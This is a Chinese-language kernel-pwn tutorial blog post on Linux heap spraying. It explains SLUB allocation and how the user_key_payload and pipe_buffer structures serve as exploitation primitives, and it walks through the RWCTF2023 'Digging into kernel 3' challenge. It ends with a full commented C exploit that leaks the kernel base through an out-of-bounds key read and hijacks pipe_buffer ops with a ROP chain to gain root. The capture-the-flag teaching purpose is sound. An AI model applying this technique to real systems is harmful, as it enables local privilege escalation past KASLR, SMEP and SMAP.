---
layout: post
title: 0x04. Linux kernel基础：堆喷射
category: kernel pwn
date: 2024-7-24 15:00:00
---

来一点小小的heap spray震撼
<!-- more -->

[toc]

# Linux kernel之堆喷射 (heap spray)

什么叫堆喷射？简单理解就是通过申请大量的内存，来保证一定能够获得某种内存排布/对某个数据结构进行溢出的方式。

## 0x00. Linux Kernel的内存管理

这一部分实际上在`UAF`部分我们已经写了，但是由于堆喷射和内存管理的知识高度相关，因此我们这里直接复制过来，熟悉的师傅们可以直接跳过。

### 内存管理的数据结构

`Linux Kernel`下的内存管理系统分为`Buddy System`（伙伴系统）和`slub allocator`，而笔者对于`buddy system`的理解有点类似于用户态下通过`mmap`来分配的、更大的内存。而`slub allocator`即管理更小的、零散的内存。

首先来看`slub allocator`的组成。笔者看到`slub allocator`的示意图后，初见觉得非常复杂，而细看后，更复杂了。但从`Linux kernel pwn`的角度来看，其实并不需要到熟读源码和细致的结构体的程度（初学阶段）。

与用户态的`chunk`对应的（只是类似，并不是完全对应），`kernel`中有一个结构体叫做`object`。它即为`slub allocator`分配的基本单元。而与用户态对应的`bins`分为两种，一个叫做`kmem_cache_cpu`，而另一种叫做`kmem_cache_node`，它们将管理我们提到的`object`。

简要介绍一下`kmem_cache_cpu`。`kmem_cache_cpu`是一个**`percpu`变量**（这意味着，每个`CPU`上都独立有一份`kmem_cache_cpu`的副本，通过`gs`寄存器作为`percpu`基址进行寻址），表示当前`CPU`使用的`slub`，直接从当前`CPU`来存取`object`，不需要加锁，能够提高性能。然而这对于我们在`Linux Kernel Pwn`中，只会成为负担，毕竟我们并不希望额外考虑当前正在使用哪个`CPU`~。因此，我们在利用前，可以将我们的程序绑定到某个`CPU`上，即可无视掉这条规则。

而对于`kmem_cache_node`，它包括两个链表，其中一个叫做`partial`，另一个叫做`full`。顾名思义，`partial`链表中，存在部分空闲的`object`；而`full`链表中，全部`object`都已经被分配了。

### 分配过程

首先，`slub allocator`从`kmem_cache_cpu`上取`object`，若`kmem_cache_cpu`上存在，则直接返回；

若`kmem_cache_cpu`上的`slub`无空闲对象了，那么该`slub`会被加入到`kmem_cache_node`中的`full`链表，并从`partial`链表中取一个`slub`挂载到`kmem_cache_cpu`上，然后重复第一步的操作，取出`object`并返回。

若`kmem_cache_cpu`的`partial`链表也空了，那么会向`buddy system`请求分配新的内存页，划分为多个`object`，并给到`kmem_cache_cpu`，取出`object`并返回。

### 释放过程

释放过程需要看被释放的`object`属于的`slub`现在位于哪里。

若其`slub`现在位于`kmem_cache_cpu`，则直接头插法插入当前`kmem_cache_cpu`的`freelist`链表。

若其`slub`属于`kmem_cache_node`的`partial`链表上的`slub`，则同样通过头插法插入对应的`slub`中的`freelist`。

若其`slub`属于`kmem_cache_node`的`full`链表上的`slub`，则会使其成为对应`slub`的`freelist`的头结点，并将该`slub`从`full`链表迁移到`partial`。

## 0x01. 基础知识：user_key_payload (kmalloc-any, GFP_KERNEL)

### 前言

本文用作堆喷射的示例结构体为内核中的密钥相关的结构体，总的来说就是围绕`user_key_payload`相关的系统调用和数据结构。因此，本文在详细介绍堆喷射之前，有必要先讲一下`user_key_payload`。

### add_key系统调用

在`Linux`内核中，有一个系统调用叫做`add_key`，其函数原型如下：

```c
#include <sys/types.h>
#include <keyutils.h>

key_serial_t add_key(const char *type, const char *description,
                            const void *payload, size_t plen,
                            key_serial_t keyring);

// 我们这里只考虑type为user的情况
```

而简单来说，通过`add_key`可以为用户申请密钥，而一个密钥包括类型、`description`描述、`payload`内容、`plen`内容长度。

而由于我们此处为`Linux kernel pwn`相关利用，因此其原本的方式我们不多过赘述。

使用`add_key`总共会申请若干个结构体，我们按照流程如下：

- 从内核中分配`obj1`和`obj2`，分别用于保存`description`和`payload`。其中`desciption`的大小为其内容长度，而`payload`大小由我们设置的`plen`指定。
- 再次分配`obj3`和`obj4`。`obj3`和`obj1`一模一样，并将`obj1`内容复制到`obj3`；`obj4`和`obj2`一模一样，并将`obj4`内容复制到`obj2`。
- 释放`obj1`和`obj2`，返回分配密钥的`id`

可以看到，无论是对于`desctiption`还是`payload`，它们**都会有一个临时的`obj`**。此外，在我们利用时，我们最好将`description`的值设置为和`payload`大小以及别的结构体毫不相关，直接不考虑`desciption`来简化利用过程。

如此一来，只考虑`payload`的情况下，流程为：

- 申请大小为`plen`的保存`payload`的`obj1`，其`flag`为`GFP_KERNEL`
- 再次申请一个大小和类型都一样的`obj2`，将`obj1`复制到`obj2`，并释放`obj1`

如此我们可以理清楚`add_key`系统调用的流程。

### user_key_payload数据结构

我们上面提到的`payload`由`user_key_payload`数据结构管理，如下所示：

```c
struct user_key_payload {
	struct rcu_head	rcu;		/* RCU destructor */
	unsigned short	datalen;	/* length of this data */
	char		data[] __aligned(__alignof__(u64)); /* actual data */
};
```

其中，`struct rcu_head`的定义如下：

```c
struct callback_head {
	struct callback_head *next;
	void (*func)(struct callback_head *head);
} __attribute__((aligned(sizeof(void *))));
#define rcu_head callback_head
```

因此，可以看到`user_key_payload`的头部（`rcu + datalen`）共有`0x18`字节，以及`data[]`来保存上文的`payload`。

### 数据泄露

当密钥被释放时，`rcu->func`将会被赋值为`user_free_payload_rcu`函数的地址，该函数地址与内核偏移固定，以及可以通过`/proc/kallsyms`查看其地址。因此，我们若释放掉密钥后又通过其他方式查看到了该内存（例如越界读），我们便可以泄露出内核基地址。

此外。`rcu->next`会被赋值为堆地址，因此可以使用同样的方式进行数据泄露。

### 读取内容 & 越界读 (KEYCTL_READ系统调用)

其实就是根据`struct user_key_payload`中的`datalen`来读取`data[]`中保存的`payload`。若我们将`datalen`覆盖为特别大的值，便可以越界读到其它内容。若其数据结构后面存在一些别的被释放掉的`user_key_payload`，便可以越界读到内核基地址。

### 释放密钥(KEYCTL_REVOKE系统调用)

很简单，通过`KEYCTL_REVOKE`系统调用即可释放掉密钥。

### CTF板子

笔者直接用了`arttnba3`师傅写好的模板，支持`musl`：

```c
#define KEY_SPEC_PROCESS_KEYRING	-2	/* - key ID for process-specific keyring */
#define KEYCTL_UPDATE			2	/* update a key */
#define KEYCTL_REVOKE			3	/* revoke a key */
#define KEYCTL_UNLINK			9	/* unlink a key from a keyring */
#define KEYCTL_READ			11	/* read a key or keyring's contents */

int key_alloc(char *description, void *payload, size_t plen)
{
    return syscall(__NR_add_key, "user", description, payload, plen, 
                   KEY_SPEC_PROCESS_KEYRING);
}

int key_update(int keyid, void *payload, size_t plen)
{
    return syscall(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
}

int key_read(int keyid, void *buffer, size_t buflen)
{
    return syscall(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
}

int key_revoke(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_REVOKE, keyid, 0, 0, 0);
}

int key_unlink(int keyid)
{
    return syscall(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
}
```

可以看到包装好了如下函数：

- `key_alloc`
- `key_update`
- `key_read`
- `key_revoke`
- `key_unlink`

## 0x02. 基础知识：pipe管道相关结构体 (GFP_KERNEL_ACCOUNT)

我们可以通过如下方式来创建一个管道：

```c
int pipe_fd[2];
pipe(pipe_fd);
```

此时其会创建两个结构体，分别是`pipe_inode_info`和`pipe_buffer`。

### pipe_inode_info (kmalloc-192 | GFP_KERNEL_ACCOUNT)

`Linux kernel`中，管道本质上会创建一个虚拟的`inode`来表示，对应的为一个`pipe_inode_info`结构体，包含管道的所有信息。其定义如下：

```c
struct pipe_inode_info {
	struct mutex mutex;
	wait_queue_head_t rd_wait, wr_wait;
	unsigned int head;
	unsigned int tail;
	unsigned int max_usage;
	unsigned int ring_size;
#ifdef CONFIG_WATCH_QUEUE
	bool note_loss;
#endif
	unsigned int nr_accounted;
	unsigned int readers;
	unsigned int writers;
	unsigned int files;
	unsigned int r_counter;
	unsigned int w_counter;
	struct page *tmp_page;
	struct fasync_struct *fasync_readers;
	struct fasync_struct *fasync_writers;
	struct pipe_buffer *bufs;
	struct user_struct *user;
#ifdef CONFIG_WATCH_QUEUE
	struct watch_queue *watch_queue;
#endif
};
```

知道创建管道的时候有这个结构体即可~用处一般

需要注意的是`pipe_inode_info`有一个指向`struct pipe_buffer`的指针，可以通过该指针获取申请到的`pipe_buffer`的地址。(`pipe_inode_info[16]`)

### pipe_buffer (kmalloc-1k | GFP_KERNEL_ACCOUNT)

创建管道时还会创建另一个比较有用的结构体，那就是`pipe_buffer`。其数据结构如下：

```c
struct pipe_buffer {
	struct page *page;
	unsigned int offset, len;
	const struct pipe_buf_operations *ops;
	unsigned int flags;
	unsigned long private;
};
```

可以看到，其中含有一张函数指针表。其定义如下：

```c
struct pipe_buf_operations {
	/*
	 * ->confirm() verifies that the data in the pipe buffer is there
	 * and that the contents are good. If the pages in the pipe belong
	 * to a file system, we may need to wait for IO completion in this
	 * hook. Returns 0 for good, or a negative error value in case of
	 * error.  If not present all pages are considered good.
	 */
	int (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * When the contents of this pipe buffer has been completely
	 * consumed by a reader, ->release() is called.
	 */
	void (*release)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Attempt to take ownership of the pipe buffer and its contents.
	 * ->try_steal() returns %true for success, in which case the contents
	 * of the pipe (the buf->page) is locked and now completely owned by the
	 * caller. The page may then be transferred to a different mapping, the
	 * most often used case is insertion into different file address space
	 * cache.
	 */
	bool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);

	/*
	 * Get a reference to the pipe buffer.
	 */
	bool (*get)(struct pipe_inode_info *, struct pipe_buffer *);
};
```

当我们调用`close()`来关闭管道的两端时，就会调用`pipe_buffer->pipe_bufer_operations->release`这个指针。因此，只要劫持了该函数表到可控区域，并关闭管道的两端即可劫持内核执行流~

## 0x03. 初探堆喷射：以RWCTF2023体验赛 Digging into kernel 3为例

### 题目信息

题目启动脚本如下：

```bash
#!/bin/sh

qemu-system-x86_64 \
	-m 128M \
	-nographic \
	-kernel ./bzImage \
	-initrd ./rootfs.img \
	-cpu kvm64,+smap,+smep \
	-monitor /dev/null \
	-append 'console=ttyS0 kaslr kpti=1 quiet oops=panic panic=1 init=/init' \
	-no-reboot \
	-snapshot \
	-s
```

可以看到，题目开启了如下机制：

- `kaslr`，这意味着我们需要计算内核基地址和其偏移
- `kpti`，这意味着我们需要无法使用`ret2user`，以及需要使用`swapgs_restore_regs_and_return_to_usermode`进行切换
- `smap & smep`，这意味着内核无法访问和执行用户态的代码

此外，根据`arttnba3`师傅所述，本题目没有开启`CONFIG_MEMCG_KMEM`，这意味着`GFP_KERNEL`与`GFP_KERNEL_ACCOUNT`会从同样的`kmalloc-xx`中分配，而不会存在隔离。

题目的`rcS`脚本如下：

```bash
#!/bin/sh

mkdir /tmp 
mount -t proc none /proc 
mount -t sysfs none /sys 
mount -t devtmpfs none /dev 
mount -t tmpfs none /tmp 

exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console

insmod /rwctf.ko
chmod 666 /dev/rwctf
chmod 700 /flag
chmod 400 /proc/kallsyms

echo 1 > /proc/sys/kernel/kptr_restrict
echo 1 > /proc/sys/kernel/dmesg_restrict

poweroff -d 120 -f &

echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds" 
setsid /bin/cttyhack setuidgid 1000 /bin/sh

umount /proc
umount /sys
umount /tmp

poweroff -d 0 -f
```

可以看到如下信息：

- 设置`kptr_restrict`为`1`，这意味着无法通过`/proc/kallsyms`查看函数地址
- 设置`dmesg_restrict`为`1`，这意味着无法通过`dmesg`查看`printk`内容
- 没有挂载`pts`，这意味无法通过打开`/dev/ptmx`来获得`tty_struct`结构体，需要利用其它方法



而实际上题目给得非常简单。只有`ioctl`函数，没有`read`和`write`等功能：

```c
__int64 __fastcall rwmod_ioctl(__int64 a1, int choice, size_t *content)
{
  __int64 v3; // r12
  __int64 index; // rbx
  __int64 v6; // rdi
  struct book book; // [rsp+0h] [rbp-30h] BYREF
  unsigned __int64 v8; // [rsp+18h] [rbp-18h]

  v8 = __readgsqword(0x28u);
  if ( !content )
    return -1LL;
  if ( choice == 0xC0DECAFE )
  {
    if ( !copy_from_user(&book, content, 16LL) && book.index <= 1 )
      kfree(buf[book.index]);
    return 0LL;
  }
  v3 = -1LL;
  if ( choice == 0xDEADBEEF )
  {
    if ( copy_from_user(&book, content, 16LL) )
      return 0LL;
    index = book.index;
    if ( book.index > 1 )
      return 0LL;
    buf[index] = _kmalloc(book.size, 0xDC0LL);
    v6 = buf[book.index];
    if ( !v6 )
      return 0LL;
    if ( book.size > 0x7FFFFFFFuLL )
      BUG();
    if ( copy_from_user(v6, book.content, book.size) )
      return 0LL;
  }
  return v3;
}
```

可以看到，其提供了两个功能，第一个是`UAF`的`kfree`，另一个为`kmalloc`，其`flag`为`GFP_KERNEL`。

题目近乎为一个裸的`UAF`，但是没有提供`edit`功能，也没有提供`read`和`write`功能。又由于程序开启了`kaslr`，因此必然需要通过结构体来泄露内核基地址了。

这里，我们就考虑使用`user_key_payload`进行越界读，使其读到`user_free_payload_rcu`。

### 堆喷射

我们上面已经提到了`user_key_payload`的分配方式。因此我们知道，`user_key_payload`会先申请一个临时的`obj`，因此，若我们通过题目功能`UAF`释放掉一个`obj`，那么打开`user_key_payload`时，`UAF`的`obj`只会作为临时`obj`来临时复制数据。因此，此时我们就可以考虑`heap spray`这样的手法来确保可以分配到`UAF obj`。当然，师傅需要已经了解`slub`的分配和释放过程。

这里相对来说比较复杂，笔者尽量写得详细一些。先来个简略版：

- 通过题目功能申请一个`obj`，然后释放，存在`UAF`，此时题目`UAF obj`位于`kmem_cache_cpu`上
- 不断堆喷射`user_key_payload`，`UAF obj`总会作为临时`obj`，完成后又回到`kmem_cache_cpu`
- 直到`kmem_cache_cpu`被完全申请完毕。此时`slub allocator`会从`kmem_cache_node`的`partial`中取出一个链表到`kmem_cache_cpu`，此时`UAF obj`仍然作为临时`obj`，但释放后被放到`kmem_cache_node`的`full`中，并由此放到`kmem_cache_node`的`partial`中
- 继续不断堆喷射`user_key_payload`，此时一直不会申请到`UAF obj`，直到当前`kmem_cache_cpu`完全耗尽
- 耗尽后，从`kmem_cache_node`的`partial`中取出一个链表。若此链表为`UAF obj`的链表，则`UAF obj`由于是第二个`obj`，因此不再会作为临时`obj`，而是作为真正的`user_key_payload`。

上面笔者已经大概进行了阐述。比较抽象，对于笔者这样的初学者，笔者初次理解起来也是非常困难的。因此，我们下面直接以一个具体的例子，来看堆喷射是如何将`UAF obj`作为`user_key_payload`，而不是临时`obj`的。

假设`kmem_cache_cpu`此时有三个`obj`，分别为`a -> b -> c`。其中，`a`为我们的`UAF obj`

- 申请一次`user_key_payload`，`a`作为临时`obj`，而`b`作为`user_key_payload`分配。释放`a`，此时`kmem_cache_cpu`为`a -> c`。

- 申请一次`user_key_payload`，`a`作为临时`obj`，而`c`作为`user_key_payload`分配。释放`a`，此时`kmem_cache_cpu`仅剩`a`。
- 申请一次`user_key_payload`，`a`作为临时`obj`，此时需要再申请一个作为`user_key_payload`，而`kmem_cache_cpu`已经耗光，因此向`kmem_cache_node`申请一条链表挂载到`kmem_cache_cpu`，而原有链表被移动到`kmem_cache_node`的`full`上。设新链表上面有`d -> e -> f`，那么取下`d`作为`user_key_payload`分配。释放`a`，而`a`属于的链表位于`kmem_cache_node`的`full`，因此将`a`作为链表头，将该链表移动到`kmem_cache_node`的`partial`上。
- 申请一次`user_key_payload`，`e`作为临时`obj`，`f`作为`user_key_payload`分配。释放`e`，此时`kmem_cache_cpu`仅剩`e`。
- 申请一次`user_key_payload`，`e`作为临时`obj`，此时需要再申请一个`obj`作为`user_key_payload`。此时，我们会从`kmem_cache_node`的`partial`链表中取下一条移动到`kmem_cache_cpu`。若恰好我们取了`a`所在的链表，而`a`是该链表头，因此我们就会取下`a`作为`user_key_payload`。如此一来，我们终于分配`user_key_payload`到了`UAF obj`。

现在，我们就明确了通过堆喷射，来保证`user_key_payload`分配到`UAF obj`的方法了。

### 利用思路

由于本题开启了`KASLR`，且没有给出读取和写入的接口，那么本题的利用方式大致可以分为如下两步：

- 使用有读取功能的结构体，泄露内核基地址
- 使用可以劫持程序控制流的结构体，劫持程序控制流

#### 泄露内核基地址

总体上，我们这里采用`user_key_payload`越界读来获取到内核基地址。

首先通过题目功能申请一块空间，并通过题目功能释放，此时获得一块`UAF`的`obj`。通过堆喷射，使得`user_key_payload`分配到该`obj`。此时，由于我们不具有编辑的能力，我们再次将其释放。随后，我们再申请回大量`obj`，并往里面都填写`user_key_payload`的文件头，并将文件头写为特别大的数(`0x2000`)，只有`UAF obj`的`user_key_payload`才会被写为`0x2000`的`datalen`。

随后，我们遍历所有的密钥`id`，并读取其内容：若其内容能读出特别长，说明其被改写了`datalen`，为我们的`victim key`；若长度没有变化，则说明是正常`user_key_payload`，我们调用`key_revoke`将其销毁，销毁时会写`user_free_payload_rcu`到头部。读到`victim key`时，就可以越界读到这个`user_free_payload_rcu`，从而泄露内核基地址。

#### 劫持程序控制流

这里没有开启`CONFIG_MEMCG_KMEM`，不存在`GFP_KERNEL`和`GFP_KERNEL_ACCOUNT`的隔离。由此，我们这里采用`pipe`相关的数据结构来劫持程序控制流。此外，注意这里没有挂载`pts`，因此是无法打开`tty`数据结构的。

又由于，我们需要构造`rop`链，而题目开启了`smep & smap`等保护，因此将`rop`链放在哪里是一个需要思考的问题：`rop`链需要位于内核中可写的位置。这里，考虑如下因素：

- `pipe_buffer`调用`release`时，其`rsi`为`pipe_buffer`自身的地址，或许我们可以利用`gadget`将栈迁移到`pipe_buffer`
- `pipe_buffer`中函数指针表我们需要控制，控制到自身是个不错的选择。而我们并不知道`pipe_buffer`的地址。

- `pipe_inode_info`中，存在一个`pipe_buffer`的指针可以获取`pipe_buffer`的地址。

那么，我们考虑使用`user_key_payload`越界读，读到`pipe_inode_info`的`pipe_buffer`指针。

题目可以分配两个`obj`，因此我们这里不再采用堆喷射，而是直接整两个`UAF obj`，然后申请`user_key_payload`，就可以让其中一个`obj`作为`user_key_payload`了。随后，我们再利用题目功能释放申请到的这个`user_key_payload`，并打开`pipe`，即可让`pipe_inode_info`和`user_key_payload`重叠（`user_key_payload`的大小是可控于任何`kmalloc`的，因此这里需要师傅构造堆风水）。重叠时，即可刚好让`user_key_payload`的`datalen`写为`0xffff`。那么，我们就可以利用`user_key_payload`越界读，读到`pipe_buffer`的地址了。

而对于`pipe_buffer`，我们通过`UAF`，将其完全滴控制即可~

### 漏洞利用

到这里，终于完结撒花~

下面是整个漏洞利用流程的`exp`，带有详细注释~

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <stdarg.h>
#include "ltfallkernel.h"

int file_fd = -1;

#define KEY_SPRAY_NUM 40
#define PIPE_INODE_INFO_SZ 192
#define PIPE_BUFFER_SZ 1024

#define USER_FREE_PAYLOAD_RCU 0Xffffffff813d8210
#define COMMIT_CREDS 0Xffffffff81095c30
#define PREPARE_KERNEL_CRED 0Xffffffff81096110
#define INIT_CRED 0Xffffffff82850580
#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0Xffffffff81e00ed0

#define PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET 0xffffffff81250c9d
#define POP_RAX_RET 0xffffffff81000ddb
#define PUSH_RAX_RET 0xffffffff81001733
#define POP_RDI_RET 0xffffffff8106ab4d
#define PUSH_RDI_RET 0xffffffff8106c515
#define RET 0xffffffff81000341
#define XCHG_RDI_RAX_RET 0xffffffff81adfc70


typedef struct
{
    unsigned int index;
    unsigned int size;
    void *ptr;
} note;

void note_free(unsigned int index)
{
    note n = {
        .index = index,
    };
    ioctl(file_fd, 0xC0DECAFE, &n);
}

void note_add(unsigned int index, unsigned int size, void *content)
{
    note n = {
        .index = index,
        .size = size,
        .ptr = content};
    ioctl(file_fd, 0xDEADBEEF, &n);
}

int main()
{
    size_t *buf;
    char description[0x100];
    int key_id[KEY_SPRAY_NUM];
    int victim_key_idx = -1;
    size_t pipe_key_id = -1;
    int pipe_fd[2];
    size_t pipe_buffer_addr = -1;

    info("Staring to exploit...");

    // 准备工作，绑定CPU核心，保存寄存器状态
    bind_core(0);
    save_status();

    // 申请一块空间备用
    buf = malloc(sizeof(size_t) * 0x4000);

    // 打开题目给的驱动
    file_fd = open("/dev/rwctf", O_RDONLY);
    if (file_fd < 0)
    {
        error("Failed to open device.");
        exit(0);
    }

    /**
     * Step1. 泄露内核基地址
     */

    // 使用题目功能申请一块空间，随后释放，存在UAF
    info("Start to construct UAF...");
    note_add(0, PIPE_INODE_INFO_SZ, buf);
    note_free(0);

    // 通过堆喷拿到user_key_payload结构体
    // 这里是比较复杂的，推荐自己玩明白
    for (int i = 0; i < KEY_SPRAY_NUM; i++)
    {
        snprintf(description, 0x100, "%s%d", "ltfall", i);
        key_id[i] = key_alloc(description, buf, PIPE_INODE_INFO_SZ - 0X18);
        if (key_id[i] < 0)
        {
            error("Failed to alloc key %d!", i);
            exit(0);
        }
    }

    // 上面已经通过堆喷将user_key_payload申请为了UAF obj
    // 但我们没有直接edit这个UAF obj的能力，只能在申请时写值
    // 而我们需要再次将其释放，并堆喷，目的是利用题目功能往obj里面写内容
    note_free(0);

    info("Spraying chunk agian...");

    // 我们利用题目功能喷射大量obj，其中肯定会写到我们的user_key_payload
    // 由于user_key_payload头第0x10字节处为datalen，我们将其覆写为0x2000，从而可以越界读
    buf[0] = 0;
    buf[1] = 0;
    buf[2] = 0x2000;

    // 由于第一步喷射了KEY_SPRAY_NUM。且一次喷射两个obj，那么这次最多只需要喷射 KEY_SPRAY_NUM * 2
    for (int i = 0; i < (KEY_SPRAY_NUM * 2); i++)
    {
        note_add(0, PIPE_INODE_INFO_SZ, buf);
    }
    // 堆喷射完成后，每个属于这个kmalloc的都被写入了一个user_key_payload的头部，包括UAF obj的user_key_payload

    // 除了UAF obj，其余所有user_key_payload的头部都是正确的，因此调用key_read不会读入太多数据
    // 因此可以利用key_read，来找到victim key.
    for (int i = 0; i < KEY_SPRAY_NUM; i++)
    {
        if (key_read(key_id[i], buf, 0x4000) > PIPE_INODE_INFO_SZ)
        {
            success("Found victim key at idx : %d!", i);
            victim_key_idx = i;
            break;
        }
        else
        {
            // 若不是victim key则释放
            // 很重要，会在释放的user_key_payload中的函数指针写USER_FREE_PAYLOAD_RCU
            // 以便于我们通过victim key越界读到这个USER_FREE_PAYLOAD_RCU
            key_revoke(key_id[i]);
        }
    }

    // 若没有找到
    if (victim_key_idx == -1)
    {
        error("Failed to find victim key!");
    }

    // 可以通过USER_FREE_PAYLOAD_RCU来获得内核基地址
    kernel_offset = -1;
    for (int i = 0; i < 0x2000 / 8; i++)
    {
        if(buf[i] >= kernel_base && (buf[i] & 0xfff) == (USER_FREE_PAYLOAD_RCU & 0Xfff)){
            kernel_offset = buf[i] - USER_FREE_PAYLOAD_RCU;
            kernel_base += kernel_offset;
            break;
        }
    }

    if(kernel_offset == -1){
        err_exit("Find kernel offset failed!");
    }
    
    info("Leaking kernel_offset of value 0x%llx...", kernel_offset);
    info("Leaking kernel_base of value 0x%llx...", kernel_base);

    /**
     * Step2. 劫持程序控制流
     */
    
    // 申请两个obj，大小均为kmalloc-192
    note_add(0, PIPE_INODE_INFO_SZ, buf);
    note_add(1, PIPE_INODE_INFO_SZ, buf);
    
    // 两个都释放，按照顺序
    note_free(1);
    note_free(0);
    // 0 -> 1

    // 我们知道key_alloc会有一个临时obj保存description，一个obj为user_key_payload
    // 0为临时obj，而1为user_key_payload
    pipe_key_id = key_alloc("ltfall", buf, PIPE_INODE_INFO_SZ - 0x18);
    // 将1也释放了，待会让pipe_inode_info结构体和1的内存重叠
    // 因为我们知道可以用user_key_payload的read功能越界读嘛，所以才这样做
    note_free(1);
    
    // 将0申请为PIPE_BUFFER_SZ大小的空间，也就是kmalloc-1k
    note_add(0, PIPE_BUFFER_SZ, buf);
    note_free(0);

    // 同时会申请pipe_buffer，为note[0]，以及pipe_inode_info，为note[1]
    pipe(pipe_fd);
    // pipe_inode_info和user_key_payload重叠，刚好写user_key_payload的datalen为0xffff

    // 读0xffff到buf，可以把pipe_inode_info的pipe_buffer指针读到buf中来
    key_read(pipe_key_id, buf, 0xffff);
    pipe_buffer_addr = buf[16];

    success("Got pipe_buffer_addr : 0x%llx.", pipe_buffer_addr);

    // 调试语句，不必理会
    info("The addr of first breakpoint should be 0x%llx.", kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET);
    info("The addr of second breakpoint should be 0x%llx.", kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x31);

    // 写好ROP，里面执行的顺序按照序号标注
    int p = 0;

    buf[p++] = *(size_t*) "ltfall12";
    buf[p++] = 0;
    buf[p++] = pipe_buffer_addr + 0x18; // 0x00. 这个地方为pipe_buffer->ops，覆盖为了pipe_buffer_addr + 0x18，因此执行0x01
    buf[p++] = kernel_offset + POP_RAX_RET; // 0x02. 从0x01栈迁移到这里，通过POP RAX去执行0x03
    buf[p++] = kernel_offset + PUSH_RSI_POP_RSP_POP_RBX_POP_RBP_POP_R12_RET; // 0x01. RSI此时为buf起始位置，执行后栈迁移到0x02
    buf[p++] = kernel_offset + POP_RDI_RET; // 0x03. 从这里开始执行ROP了
    buf[p++] = NULL;
    buf[p++] = kernel_offset + RET;
    buf[p++] = kernel_offset + PREPARE_KERNEL_CRED;
    buf[p++] = kernel_offset + XCHG_RDI_RAX_RET;
    buf[p++] = kernel_offset + COMMIT_CREDS;
    buf[p++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x31; // 0x04. 这里注意，需要跳过前面的栈操作，从mov rdi, rsp开始
    buf[p++] = 0; // 0x05. 使用swapgs_restore_regs_and_return_to_usermode需要后面写两个0
    buf[p++] = 0;
    buf[p++] = get_root_shell;
    buf[p++] = user_cs;
    buf[p++] = user_rflags;
    buf[p++] = user_sp;
    buf[p++] = user_ss;

    // 将pipe_buffer释放
    note_free(0);
    // 然后瞬间申请回来，往里面写rop
    note_add(0, PIPE_BUFFER_SZ, buf);

    info("Triggering exploit by close pipe...");

    // 通过close pipe的两端，就会触发pipe_buffer->pipe_buffer_operations->release
    close(pipe_fd[1]);
    close(pipe_fd[0]);

    info("exiting...");

    return 0;
}
```





